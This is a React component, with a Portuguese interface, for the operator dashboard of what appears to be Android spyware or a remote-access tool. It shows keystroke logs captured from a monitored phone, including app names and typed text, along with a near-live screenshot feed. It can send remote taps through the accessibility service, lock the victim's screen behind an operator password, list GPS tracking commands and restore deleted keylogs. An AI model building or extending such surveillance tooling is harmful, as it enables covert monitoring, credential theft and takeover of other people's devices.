import { useMemo, useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import LockedScreen from "@/components/LockedScreen";
import PhoneFrame from "@/components/PhoneFrame";
import { trpc } from "@/lib/trpc";

interface DeviceDetailsProps {
  deviceId: string;
  deviceName: string;
  onBack: () => void;
}

export default function DeviceDetails({
  deviceId,
  deviceName,
  onBack,
}: DeviceDetailsProps) {
  const utils = trpc.useUtils();
  const numericDeviceId = Number(deviceId);
  const [activeTab, setActiveTab] = useState("info");
  const [isLiveActive, setIsLiveActive] = useState(true);
  const [isControlActive, setIsControlActive] = useState(false);
  const [isScreenLocked, setIsScreenLocked] = useState(false);
  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
  const [lastTapPoint, setLastTapPoint] = useState<{ x: number; y: number } | null>(null);

  const devicesQuery = trpc.device.list.useQuery(undefined, {
    refetchInterval: 10000,
  });
  const screenshotsQuery = trpc.corporate.screenshots.list.useQuery(
    { deviceId: numericDeviceId, limit: 24 },
    {
      enabled: Number.isFinite(numericDeviceId),
      refetchInterval: isLiveActive ? 3000 : false,
      refetchOnWindowFocus: true,
    }
  );

  const device = useMemo(
    () => devicesQuery.data?.find((item) => item.id === numericDeviceId),
    [devicesQuery.data, numericDeviceId]
  );

  const screenshots = screenshotsQuery.data ?? [];
  const latestScreenshot = screenshots[0] ?? null;
  const lastSeenLabel = device?.lastSeen
    ? new Date(device.lastSeen).toLocaleString("pt-BR")
    : "Indisponivel";
  const liveStatusLabel = latestScreenshot
    ? `Ultima captura em ${new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}`
    : "Aguardando primeira captura do dispositivo";

  // Fetch keylogs from backend
  const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
    { deviceId },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Fetch deleted keylogs from backend
  const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
    { deviceId }
  );

  // Mutations
  const deleteKeylogMutation = trpc.keylogs.delete.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
      setSelectedKeylogs(new Set());
    },
  });

  const restoreKeylogMutation = trpc.keylogs.restore.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
    },
  });

  const removeDeviceMutation = trpc.device.remove.useMutation({
    onSuccess: async () => {
      await utils.device.list.invalidate();
      await screenshotsQuery.refetch();
      onBack();
    },
  });

  const deleteScreenshotMutation = trpc.corporate.screenshots.delete.useMutation({
    onSuccess: async () => {
      await screenshotsQuery.refetch();
    },
  });

  const lockScreenMutation = trpc.screenLock.lock.useMutation({
    onSuccess: () => {
      setIsScreenLocked(true);
      alert("🔒 Tela travada! Apenas você pode destravar com a senha.");
    },
  });

  const unlockScreenMutation = trpc.screenLock.unlock.useMutation({
    onSuccess: () => {
      setIsScreenLocked(false);
      alert("🔓 Tela desbloqueada com sucesso!");
    },
  });

  const handleScreenshot = () => {
    screenshotsQuery.refetch();
  };

  const remoteTapMutation = trpc.corporate.remoteControl.tap.useMutation({
    onError: () => {
      alert("Falha ao enviar comando de toque.");
    },
  });

  const handleActivateControl = () => {
    const nextState = !isControlActive;
    setIsControlActive(nextState);
    alert(
      nextState
        ? "🎮 Modo de controle ativado. Clique na tela ao vivo para enviar toques."
        : "🎮 Modo de controle desativado"
    );
  };

  const handleLiveScreenClick = (event: React.MouseEvent<HTMLDivElement>) => {
    if (!isControlActive || !latestScreenshot) return;

    const rect = event.currentTarget.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const y = event.clientY - rect.top;
    const xPercent = Math.max(0, Math.min(100, (x / rect.width) * 100));
    const yPercent = Math.max(0, Math.min(100, (y / rect.height) * 100));

    setLastTapPoint({ x: xPercent, y: yPercent });

    remoteTapMutation.mutate({
      deviceId: numericDeviceId,
      xPercent,
      yPercent,
    });
  };

  const handleLockScreen = () => {
    lockScreenMutation.mutate({ deviceId: numericDeviceId });
  };

  const handleUnlockScreen = () => {
    unlockScreenMutation.mutate({ deviceId: numericDeviceId });
  };

  const handleRemoveDevice = () => {
    if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
      removeDeviceMutation.mutate({ deviceId: numericDeviceId });
    }
  };

  const handleToggleKeylogSelection = (id: number) => {
    const newSelected = new Set(selectedKeylogs);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedKeylogs(newSelected);
  };

  const handleRemoveSelectedKeylogs = () => {
    if (selectedKeylogs.size === 0) {
      alert("Selecione pelo menos um keylog para remover");
      return;
    }
    selectedKeylogs.forEach((id) => {
      deleteKeylogMutation.mutate({ keylogId: id });
    });
  };

  const handleRemoveAllKeylogs = () => {
    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
      keylogs.forEach((keylog) => {
        deleteKeylogMutation.mutate({ keylogId: keylog.id });
      });
    }
  };

  const handleRestoreKeylog = (id: number) => {
    restoreKeylogMutation.mutate({ keylogId: id });
  };

  const handleDeleteScreenshot = (screenshotId: number) => {
    if (confirm("Tem certeza que deseja deletar este screenshot?")) {
      deleteScreenshotMutation.mutate({ screenshotId });
    }
  };

  const isScreenshotStale = () => {
    if (!latestScreenshot) return false;
    const now = new Date().getTime();
    const captureTime = new Date(latestScreenshot.createdAt).getTime();
    const diffSeconds = (now - captureTime) / 1000;
    return diffSeconds > 30;
  };

  const getFlagFromCountryCode = (countryCode?: string) => {
    if (!countryCode || countryCode.length !== 2) return "🏳️";

    const codePoints = countryCode
      .toUpperCase()
      .split("")
      .map((char) => 127397 + char.charCodeAt(0));

    return String.fromCodePoint(...codePoints);
  };

  // Format timestamp to readable time
  const formatTime = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleTimeString("pt-BR");
  };

  if (isScreenLocked) {
    return <LockedScreen deviceName={deviceName} onUnlock={handleUnlockScreen} />;
  }

  return (
    <div className="space-y-6 pb-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <Button
          onClick={onBack}
          variant="outline"
          className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
        >
          ← Voltar
        </Button>
        <h1 className="text-3xl font-bold text-cyan-400">
          {deviceName}
        </h1>
      </div>

      {/* Action Buttons */}
      <div className="flex flex-wrap gap-3">
        <Button
          onClick={handleScreenshot}
          className="bg-cyan-500 hover:bg-cyan-600 text-white"
        >
          📸 Capturar Screenshot
        </Button>
        <Button
          onClick={() => {
            if (isLiveActive) {
              setIsLiveActive(false);
              alert("⏹️ Visualização ao vivo parada");
            } else {
              setIsLiveActive(true);
              alert("▶️ Visualização ao vivo retomada");
            }
          }}
          className={isLiveActive ? "bg-red-600 hover:bg-red-700 text-white" : "bg-green-600 hover:bg-green-700 text-white"}
        >
          {isLiveActive ? "⏹️ Parar Ao Vivo" : "▶️ Começar Ao Vivo"}
        </Button>
        <Button
          onClick={handleActivateControl}
          className={isControlActive ? "bg-emerald-600 hover:bg-emerald-700 text-white" : "bg-blue-600 hover:bg-blue-700 text-white"}
        >
          {isControlActive ? "🎮 Desativar Controle" : "🎮 Ativar Controle"}
        </Button>
        <Button
          onClick={handleLockScreen}
          className="bg-orange-600 hover:bg-orange-700 text-white"
        >
          🚫 Travar Tela
        </Button>
        <Button
          onClick={handleRemoveDevice}
          disabled={removeDeviceMutation.isPending}
          className="bg-red-700 hover:bg-red-800 text-white"
        >
          {removeDeviceMutation.isPending ? "Removendo..." : "🗑️ Remover Dispositivo"}
        </Button>
      </div>

      {/* Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
          <TabsTrigger
            value="info"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ℹ️ Informações
          </TabsTrigger>
          <TabsTrigger
            value="commands"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⚙️ Comandos
          </TabsTrigger>
          <TabsTrigger
            value="screenshots"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📸 Screenshots
          </TabsTrigger>
          <TabsTrigger
            value="keylogs"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⌨️ Keylogs
          </TabsTrigger>
          <TabsTrigger
            value="history"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📜 Histórico
          </TabsTrigger>
        </TabsList>

        {/* Aba: Informações */}
        <TabsContent value="info" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
              <div className="space-y-3 text-slate-300">
                <div>
                  <p className="text-slate-400 text-sm">Nome do Dispositivo</p>
                  <p className="font-semibold">{deviceName}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Modelo</p>
                  <p className="font-semibold">{device?.deviceType || "Android"}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Status</p>
                  <p className="font-semibold">
                    {device?.status === "online" ? "Online" : "Offline"}
                  </p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Ultimo contato</p>
                  <p className="font-semibold">{lastSeenLabel}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Localização</p>
                  <p className="font-semibold">{device?.location || "Indisponivel"}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">País</p>
                  <p className="font-semibold">
                    {getFlagFromCountryCode(device?.countryCode)} {device?.countryCode || "N/D"}
                  </p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">IP</p>
                  <p className="font-semibold">{device?.ipAddress || "Indisponivel"}</p>
                </div>
              </div>
            </Card>

            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Capturas recebidas</p>
                    <p className="text-cyan-400 font-semibold">{screenshots.length}</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div
                      className="bg-cyan-500 h-2 rounded-full"
                      style={{ width: `${Math.min(screenshots.length, 24) / 24 * 100}%` }}
                    ></div>
                  </div>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Feed atual</p>
                  <p className="text-cyan-400 font-semibold">{liveStatusLabel}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Atualização automática</p>
                  <p className="text-cyan-400 font-semibold">
                    {isLiveActive ? "Ligada a cada 3 segundos" : "Pausada"}
                  </p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Controle</p>
                  <p className="text-cyan-400 font-semibold">
                    {isControlActive ? "Modo visual ativo" : "Desativado"}
                  </p>
                  {isControlActive && (
                    <p className="mt-1 text-xs text-slate-400">
                      Toques reais exigem o servico de acessibilidade ativo no aparelho monitorado.
                    </p>
                  )}
                </div>
                {lastTapPoint && (
                  <div>
                    <p className="text-slate-400 text-sm">Ultimo toque enviado</p>
                    <p className="text-cyan-400 font-semibold">
                      X {lastTapPoint.x.toFixed(1)}% | Y {lastTapPoint.y.toFixed(1)}%
                    </p>
                  </div>
                )}
                <div>
                  <p className="text-slate-400 text-sm">Último Acesso</p>
                  <p className="text-cyan-400 font-semibold">{lastSeenLabel}</p>
                </div>
              </div>
            </Card>
          </div>
        </TabsContent>

        {/* Aba: Comandos */}
        <TabsContent value="commands" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
              { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
              { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
              { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
              { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
              { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
            ].map((cmd, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-2xl mb-2">{cmd.icon}</p>
                    <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                    <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                  </div>
                </div>
                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">
                  Executar
                </Button>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Screenshots */}
        <TabsContent value="screenshots" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">
              📸 Screenshots Capturados ({screenshots.length})
            </h3>
            
            {isScreenshotStale() && screenshots.length > 0 && (
              <div className="mb-4 p-4 bg-yellow-900/30 border border-yellow-600/50 rounded-lg">
                <p className="text-yellow-400 text-sm">
                  ⚠️ Sem novas capturas há {Math.round((new Date().getTime() - new Date(latestScreenshot?.createdAt || 0).getTime()) / 1000)}s - dispositivo pode estar desconectado
                </p>
              </div>
            )}
            
            {screenshotsQuery.isLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando screenshots...</p>
            ) : screenshots.length === 0 ? (
              <p className="text-slate-400 text-center py-8">
                Nenhuma captura real recebida ainda para este dispositivo.
              </p>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                {screenshots.map((screenshot) => (
                  <div
                    key={screenshot.id}
                    className="overflow-hidden rounded-lg border border-slate-600 bg-slate-900 hover:border-cyan-500 transition group"
                  >
                    <a
                      href={screenshot.screenshotUrl ?? screenshot.imageUrl ?? "#"}
                      target="_blank"
                      rel="noreferrer"
                      className="block relative"
                    >
                      <img
                        src={screenshot.screenshotUrl ?? screenshot.imageUrl ?? ""}
                        alt={`Screenshot de ${deviceName}`}
                        className="aspect-video w-full object-cover"
                      />
                    </a>
                    <div className="p-3 text-sm text-slate-300">
                      <p>{new Date(screenshot.createdAt).toLocaleString("pt-BR")}</p>
                      <p className="text-cyan-400">{screenshot.captureType}</p>
                      <Button
                        onClick={() => handleDeleteScreenshot(screenshot.id)}
                        disabled={deleteScreenshotMutation.isPending}
                        className="w-full mt-2 bg-red-600 hover:bg-red-700 text-white text-xs py-1"
                      >
                        {deleteScreenshotMutation.isPending ? "Deletando..." : "🗑️ Deletar"}
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Keylogs */}
        <TabsContent value="keylogs" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-cyan-400 font-bold">⌨️ Keylogs Capturados ({keylogs.length})</h3>
              <div className="flex gap-2">
                <Button
                  onClick={handleRemoveSelectedKeylogs}
                  disabled={selectedKeylogs.size === 0}
                  className="bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
                >
                  🗑️ Remover Selecionados ({selectedKeylogs.size})
                </Button>
                <Button
                  onClick={handleRemoveAllKeylogs}
                  className="bg-red-700 hover:bg-red-800 text-white"
                >
                  ⚠️ Remover Todos
                </Button>
              </div>
            </div>

            {keylogsLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
            ) : keylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog capturado</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {keylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                  >
                    <input
                      type="checkbox"
                      checked={selectedKeylogs.has(log.id)}
                      onChange={() => handleToggleKeylogSelection(log.id)}
                      className="w-4 h-4 cursor-pointer"
                    />
                    <div className="flex-1">
                      <p className="text-slate-300">
                        <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Histórico */}
        <TabsContent value="history" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({deletedKeylogs.length})</h3>
            {deletedKeylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {deletedKeylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
                  >
                    <div>
                      <p className="text-slate-300">
                        <span className="text-yellow-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                    <Button
                      onClick={() => handleRestoreKeylog(log.id)}
                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
                    >
                      ↩️ Restaurar
                    </Button>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>
      </Tabs>

      {/* Visualização ao Vivo */}
      {isLiveActive && (
        <div className="mt-8">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="mb-4 flex items-center justify-between gap-3">
              <div>
                <h3 className="text-cyan-400 font-bold">🔴 Visualização Ao Vivo</h3>
                <p className="text-sm text-slate-400">
                  Feed real baseado nas ultimas capturas recebidas do dispositivo.
                </p>
              </div>
              <span
                className={`rounded-full px-3 py-1 text-xs font-bold ${
                  device?.status === "online"
                    ? "bg-green-900/30 text-green-300"
                    : "bg-red-900/30 text-red-300"
                }`}
              >
                {device?.status === "online" ? "Online" : "Offline"}
              </span>
            </div>
            <div className="flex justify-center py-8">
              <PhoneFrame status={liveStatusLabel}>
                {screenshotsQuery.isLoading ? (
                  <div className="flex h-full items-center justify-center text-slate-400">
                    Carregando tela...
                  </div>
                ) : latestScreenshot ? (
                  <div
                    onClick={handleLiveScreenClick}
                    className={`relative h-full w-full bg-black ${isControlActive ? "cursor-crosshair" : "cursor-default"}`}
                  >
                    <img
                      src={latestScreenshot.screenshotUrl ?? latestScreenshot.imageUrl ?? ""}
                      alt={`Tela atual de ${deviceName}`}
                      className="h-full w-full object-contain bg-black"
                    />
                    {isControlActive && (
                      <div className="pointer-events-none absolute left-2 top-2 rounded bg-cyan-900/70 px-2 py-1 text-xs text-cyan-200">
                        Toque para enviar comando
                      </div>
                    )}
                    {lastTapPoint && isControlActive && (
                      <div
                        className="pointer-events-none absolute h-4 w-4 -translate-x-1/2 -translate-y-1/2 rounded-full border-2 border-cyan-300 bg-cyan-500/30"
                        style={{ left: `${lastTapPoint.x}%`, top: `${lastTapPoint.y}%` }}
                      />
                    )}
                  </div>
                ) : (
                  <div className="px-6 text-center text-slate-400">
                    <p className="text-sm">Nenhuma captura real disponivel ainda.</p>
                    <p className="mt-2 text-xs text-slate-500">
                      Assim que o dispositivo enviar screenshots, a tela aparece aqui automaticamente.
                    </p>
                  </div>
                )}
              </PhoneFrame>
            </div>
          </Card>
        </div>
      )}
    </div>
  );
}
